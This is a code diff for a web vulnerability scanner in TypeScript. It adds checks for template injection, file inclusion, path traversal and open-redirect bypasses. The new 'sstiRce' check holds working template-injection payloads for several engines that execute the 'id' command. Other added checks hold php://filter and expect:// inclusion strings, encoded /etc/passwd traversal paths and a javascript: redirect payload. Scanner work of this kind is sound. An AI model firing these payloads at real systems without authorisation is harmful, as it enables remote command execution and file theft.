@@ -190,7 +190,7 @@ export const passiveAudit: ScanCheck = {
     };
   },
 };
-const sqlError =
+export const sqlError =
   /SQLSTATE\[[A-Z0-9]{5}\]|You have an error in your SQL syntax|unclosed quotation mark|unterminated quoted string|ORA-01756|SQLite.*(?:syntax|error)|PostgreSQL.*ERROR/i;
 // Mask only the selected HTML form field; preserve all other response content.
 function sqlComparable(ctx: ScanCheckContext, x: Exchange, replacement: string) {
@@ -359,6 +359,24 @@ export const sqlInjection: ScanCheck = {
     );
   },
 };
+async function templateFingerprint(ctx: ScanCheckContext): Promise<string | undefined> {
+  if (!ctx.parameter) return undefined;
+  const prefix = ctx.nonce();
+  const suffix = ctx.nonce();
+  const probe = await ctx.probe(
+    mutateParameter(ctx.request, ctx.parameter, `${prefix}{{7*'7'}}${suffix}`),
+    "Template engine fingerprint",
+  );
+  if (!ok(probe)) return undefined;
+  const body = text(probe);
+  if (body.includes(`${prefix}7777777${suffix}`)) return "Jinja2";
+  if (body.includes(`${prefix}49${suffix}`)) return "Twig/Nunjucks";
+  return undefined;
+}
+
+const templateError =
+  /jinja2\.exceptions|TemplateSyntaxError|Twig\\?Error|freemarker\.core|FreeMarker template error|org\.thymeleaf|thymeleaf\.exceptions|Liquid error|ERB syntax|ParseError[^\n]*template/i;
+
 export const ssti: ScanCheck = {
   id: "ssti",
   name: "Server-side template arithmetic",
@@ -368,6 +386,7 @@ export const ssti: ScanCheck = {
     if (!ctx.stable || !ctx.parameter)
       return result("Stable baselines and selected parameter required.", true);
     const responses: Exchange[] = [];
+    let evaluated = true;
     for (const [a, b] of [
       [137, 149],
       [157, 163],
@@ -384,19 +403,146 @@ export const ssti: ScanCheck = {
         "Template syntax control",
       );
       if (!ok(probe) || !ok(control)) return result("Incomplete template evidence.", true);
-      if (!text(probe).includes(expected) || text(control).includes(expected))
-        return result("No controlled template arithmetic evaluation observed.");
+      if (!text(probe).includes(expected) || text(control).includes(expected)) {
+        evaluated = false;
+        break;
+      }
       responses.push(probe, control);
     }
-    return observation(
-      "Possible server-side template evaluation",
-      "Two arithmetic expressions were evaluated between unique markers while invalid-expression controls were not. Confirm template context and impact.",
-      responses,
-      ["Two independent marked arithmetic results observed"],
-      "high",
+    if (evaluated) {
+      const engine = await templateFingerprint(ctx);
+      return observation(
+        "Possible server-side template evaluation",
+        "Two arithmetic expressions were evaluated between unique markers while invalid-expression controls were not. Confirm template context and impact.",
+        responses,
+        [
+          "Two independent marked arithmetic results observed",
+          ...(engine ? [`Engine fingerprint: ${engine}`] : []),
+        ],
+        "high",
+      );
+    }
+
+    // Other engine syntaxes, still arithmetic-only and non-intrusive.
+    for (const [open, close, label] of [
+      ["${", "}", "Freemarker/JSP EL"],
+      ["#{", "}", "Ruby/Thymeleaf"],
+      ["<%=", "%>", "ERB/EJS"],
+      ["*{", "}", "Thymeleaf"],
+      ["@(", ")", "Razor"],
+    ] as const) {
+      const a = 137;
+      const b = 149;
+      const prefix = ctx.nonce();
+      const suffix = ctx.nonce();
+      const expected = prefix + a * b + suffix;
+      const probe = await ctx.probe(
+        mutateParameter(ctx.request, ctx.parameter, `${prefix}${open}${a}*${b}${close}${suffix}`),
+        `Template ${label} arithmetic probe`,
+      );
+      const control = await ctx.probe(
+        mutateParameter(ctx.request, ctx.parameter, `${prefix}${open}${a}x${b}${close}${suffix}`),
+        `Template ${label} syntax control`,
+      );
+      if (!ok(probe) || !ok(control)) return result("Incomplete template evidence.", true);
+      if (text(probe).includes(expected) && !text(control).includes(expected)) {
+        const engine = await templateFingerprint(ctx);
+        return observation(
+          `Possible server-side template evaluation: ${label} syntax`,
+          "An arithmetic expression in an engine-specific syntax was evaluated between unique markers while the invalid-expression control was not. This identifies the template syntax family; confirm the engine and impact.",
+          [probe, control],
+          [
+            `Evaluated syntax: ${open}...${close}`,
+            ...(engine ? [`Engine fingerprint: ${engine}`] : []),
+          ],
+          "high",
+        );
+      }
+    }
+
+    // Polyglot is used only as a parser/error probe, never as an execution payload.
+    const marker = ctx.nonce();
+    const polyglot = "${{<%[%'\"}}%\\";
+    const probe = await ctx.probe(
+      mutateParameter(ctx.request, ctx.parameter, `${marker}${polyglot}${marker}`),
+      "Template polyglot parser probe",
     );
+    const control = await ctx.probe(
+      mutateParameter(ctx.request, ctx.parameter, marker),
+      "Template polyglot control",
+    );
+    if (ok(probe) && ok(control) && templateError.test(text(probe)) && !templateError.test(text(control)))
+      return observation(
+        "Template engine error disclosed by a polyglot probe",
+        "A parser polyglot produced a template-engine error that a plain marker did not. This is engine/error disclosure, not proof of evaluation; confirm with arithmetic probes.",
+        [control, probe],
+        ["Polyglot payload caused a template parser error"],
+        "low",
+      );
+    return result("No controlled template arithmetic evaluation observed.");
   },
 };
+
+export const sstiRce: ScanCheck = {
+  id: "ssti-rce",
+  name: "SSTI — engine proof-of-concept (benign id)",
+  active: true,
+  perParameter: true,
+  async run(ctx) {
+    if (!ctx.stable || !ctx.parameter)
+      return result("Stable baselines and selected parameter required.", true);
+    const uid = /(?:^|\n)uid=\d+\([^)]*\) gid=\d+\(/;
+    if (ctx.baselines.some((x) => uid.test(text(x))))
+      return result("Baseline already contains command-output signatures.", true);
+    const controlValue = `slurp_${ctx.nonce().replace(/[^a-zA-Z0-9]/g, "")}`;
+    const payloads = [
+      {
+        engine: "Jinja2",
+        payload: "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+      },
+      {
+        engine: "Twig",
+        payload:
+          '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
+      },
+      {
+        engine: "Freemarker",
+        payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
+      },
+      { engine: "ERB/EJS", payload: '<%= system("id") %>' },
+      {
+        engine: "Thymeleaf",
+        payload: '__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x',
+      },
+    ];
+    for (const { engine, payload } of payloads) {
+      const probe = await ctx.probe(
+        mutateParameter(ctx.request, ctx.parameter, payload),
+        `${engine} template command probe`,
+      );
+      const repeat = await ctx.probe(
+        mutateParameter(ctx.request, ctx.parameter, payload),
+        `${engine} template command repeat`,
+      );
+      const control = await ctx.probe(
+        mutateParameter(ctx.request, ctx.parameter, controlValue),
+        `${engine} benign control`,
+      );
+      if (![probe, repeat, control].every(ok))
+        return result("Incomplete template command evidence.", true);
+      if (uid.test(text(probe)) && uid.test(text(repeat)) && !uid.test(text(control)))
+        return observation(
+          `Server-side template injection: ${engine} executed a benign command`,
+          "The engine proof-of-concept payload returned the output of `id` twice while a benign value and the baseline did not. Only `id` was executed; no shell, file read or data change was performed, and template context still requires review.",
+          [...ctx.baselines, probe, repeat, control],
+          [`Payload: ${payload}`, "uid/gid command output reproduced twice"],
+          "high",
+        );
+    }
+    return result("No benign command output observed for the supported engine payloads.");
+  },
+};
+
 export const traversal: ScanCheck = {
   id: "path-traversal",
   name: "File path traversal — content signatures",
@@ -406,14 +552,24 @@ export const traversal: ScanCheck = {
     if (!ctx.stable || !ctx.parameter)
       return result("Stable baselines and selected parameter required.", true);
     const signature =
-      /(?:^|\n)root:[^:\n]*:0:0:[^\n]*:[^\n]*\/[^\n]*|\[extensions\][\s\S]{0,500}\[fonts\]|\[fonts\][\s\S]{0,500}\[(?:extensions|mci extensions)\]/i;
+      /(?:^|\n)root:[^:\n]*:0:0:[^\n]*:[^\n]*\/[^\n]*|\[extensions\][\s\S]{0,500}\[fonts\]|\[fonts\][\s\S]{0,500}\[(?:extensions|mci extensions)\]|# Copyright \(c\) 1993-2009 Microsoft Corp\./i;
     if (ctx.baselines.some((x) => signature.test(text(x))))
       return result("Baseline already contains file signatures.", true);
     for (const payload of [
       "../../../../../../etc/passwd",
-      "..\\..\\..\\..\\Windows\\win.ini",
+      "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
       "%2e%2e%2f".repeat(6) + "etc%2fpasswd",
+      "....//....//....//....//etc/passwd",
       "%252e%252e%252f".repeat(6) + "etc%252fpasswd",
+      "..\\..\\..\\..\\Windows\\win.ini",
+      "..\\..\\Windows\\System32\\drivers\\etc\\hosts",
+      "C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "\\\\?\\C:\\Windows\\win.ini",
+      "/etc/passwd\u0000.png",
+      "..;/..;/..;/etc/passwd",
+      "%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+      "%uff0e%uff0e/%uff0e%uff0e/etc/passwd",
+      "../../../../../../etc/passwd/.",
     ]) {
       const probe = await ctx.probe(
         mutateParameter(ctx.request, ctx.parameter, payload),
@@ -443,6 +599,79 @@ export const traversal: ScanCheck = {
         );
     }
     return result("No controlled system-file disclosure observed for supported payloads.");
+  },
+};
+export const fileInclusion: ScanCheck = {
+  id: "file-inclusion",
+  name: "Local/remote file inclusion — wrappers and resource signatures",
+  active: true,
+  perParameter: true,
+  async run(ctx) {
+    if (!ctx.stable || !ctx.parameter)
+      return result("Stable baselines and selected parameter required.", true);
+    const root = /(?:^|\n)root:[^:\n]*:0:0:[^\n]*/;
+    const uid = /(?:^|\n)uid=\d+\([^)]*\)/;
+    const marker = ctx.nonce();
+    const decodedRoot = (body: string) =>
+      (body.match(/[A-Za-z0-9+/]{40,}={0,2}/g) ?? []).some((value) => {
+        try {
+          return root.test(atob(value));
+        } catch {
+          return false;
+        }
+      });
+    const leaked = (body: string) =>
+      root.test(body) || decodedRoot(body) || body.includes(marker) || uid.test(body);
+    if (ctx.baselines.some((x) => leaked(text(x)) || text(x).includes("Example Domain")))
+      return result("Baseline already contains file, command or remote-content signatures.", true);
+    for (const payload of [
+      "php://filter/convert.base64-encode/resource=/etc/passwd",
+      "php://filter/read=convert.base64-encode/resource=/etc/passwd",
+      "file:///etc/passwd",
+      "/etc/passwd",
+      `data://text/plain;base64,${btoa(marker)}`,
+      "expect://id",
+      "http://example.com/",
+    ]) {
+      const probe = await ctx.probe(
+        mutateParameter(ctx.request, ctx.parameter, payload),
+        "File inclusion probe",
+      );
+      const repeat = await ctx.probe(
+        mutateParameter(ctx.request, ctx.parameter, payload),
+        "File inclusion repeat",
+      );
+      const control = await ctx.probe(
+        mutateParameter(
+          ctx.request,
+          ctx.parameter,
+          "php://filter/convert.base64-encode/resource=/slurp-missing-" + ctx.nonce(),
+        ),
+        "Missing-resource control",
+      );
+      if (![probe, repeat, control].every(ok))
+        return result("Incomplete file-inclusion evidence.", true);
+      const matched = (body: string) =>
+        leaked(body) || (payload === "http://example.com/" && body.includes("Example Domain"));
+      if (
+        matched(text(probe)) &&
+        matched(text(repeat)) &&
+        !matched(text(control))
+      )
+        return observation(
+          "Possible local/remote file inclusion: wrapper or resource content returned",
+          "Repeated inclusion values returned system-file content, a decodable base64-encoded copy, or the decoded data-wrapper marker, while baselines and a missing-resource control did not. Confirm which resource was included and whether the parameter is meant to accept a path or URL.",
+          [...ctx.baselines, probe, repeat, control],
+          [
+            "Payload: " + payload,
+            leaked(text(probe)) && marker && text(probe).includes(marker)
+              ? "Data-wrapper marker executed"
+              : "System-file signature or decodable copy observed",
+          ],
+          "high",
+        );
+    }
+    return result("No controlled file-inclusion evidence for supported wrappers and resources.");
   },
 };
 export const openRedirect: ScanCheck = {
@@ -485,7 +714,71 @@ export const openRedirect: ScanCheck = {
           "medium",
         );
     }
+    const origin = new URL(ctx.request.url);
+    const attackerHost = (nonce: string) => `${nonce.toLowerCase()}.invalid`;
+    const bypasses = [
+      (host: string) => `https://${origin.hostname}@${host}/`,
+      (host: string) => `https://${origin.hostname}.${host}/`,
+      (host: string) => `https:%2f%2f${host}/`,
+      (host: string) => `%2f%2f${host}/`,
+      (host: string) => `//${host}/%2f..`,
+      (host: string) => `/\\${host}/`,
+    ];
+    for (const make of bypasses) {
+      const host = attackerHost(ctx.nonce());
+      const value = make(host);
+      const rows: Exchange[] = [];
+      for (let i = 0; i < 2; i++) {
+        const probe = await ctx.probe(
+          mutateParameter(ctx.request, ctx.parameter, value),
+          "Redirect bypass probe",
+        );
+        if (!ok(probe) || ![301, 302, 303, 307, 308].includes(probe.response!.status)) break;
+        let target: URL;
+        try {
+          target = new URL(h(probe, "location"), ctx.request.url);
+        } catch {
+          break;
+        }
+        if (
+          target.hostname !== host ||
+          !["https:", "http:"].includes(target.protocol)
+        )
+          break;
+        rows.push(probe);
+      }
+      if (rows.length === 2)
+        return observation(
+          "Open redirect bypass accepted",
+          "A crafted redirect value containing the legitimate host resolved to the attacker host twice in the Location header. Prefix, suffix, encoded-slash, protocol-relative and backslash normalization forms were tested; the redirect was not followed.",
+          rows,
+          [`Payload: ${value}`, `Resolved host: ${host}`],
+          "medium",
+        );
+    }
+    for (let i = 0; i < 2; i++) {
+      const probe = await ctx.probe(
+        mutateParameter(ctx.request, ctx.parameter, "javascript:alert(1)"),
+        "Redirect javascript scheme probe",
+      );
+      if (!ok(probe) || ![301, 302, 303, 307, 308].includes(probe.response!.status)) break;
+      let target: URL;
+      try {
+        target = new URL(h(probe, "location"), ctx.request.url);
+      } catch {
+        break;
+      }
+      if (target.protocol !== "javascript:") break;
+      if (i === 1)
+        return observation(
+          "Redirect to a javascript: URI",
+          "Two redirect responses placed a javascript: URI in Location for a supplied parameter. If a client follows that Location, script executes in the redirecting origin; the payload was not executed by this check.",
+          [probe],
+          ["Location uses the javascript: scheme"],
+          "high",
+        );
+    }
     return result("No external redirect to both independent destinations for supported URL forms.");
   },
 };
-export const extendedChecks = [passiveAudit, sqlInjection, ssti, traversal, openRedirect];
+export const extendedChecks = [passiveAudit, sqlInjection, ssti, sstiRce, traversal, fileInclusion, openRedirect];
